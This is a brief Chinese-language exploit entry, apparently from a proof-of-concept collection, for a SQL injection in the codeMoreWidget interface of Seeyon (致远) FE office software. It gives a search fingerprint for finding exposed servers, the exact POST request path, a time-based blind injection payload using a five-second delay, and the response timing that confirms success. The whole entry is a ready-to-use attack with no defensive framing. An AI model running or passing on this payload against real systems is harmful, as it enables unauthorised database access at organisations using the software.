# 致远-Fe-codeMoreWidget接口存在SQL注入漏洞

致远OA ｜ SQL注入 ｜ —
- **指纹**：`app="致远互联-FE"`
- **请求**：`POST /common/codeMoreWidget.js%70 HTTP/1.1`

**Payload**
```
code=-1';waitfor delay '0:0:5'--
```
- **响应特征**：200 响应时间>=5s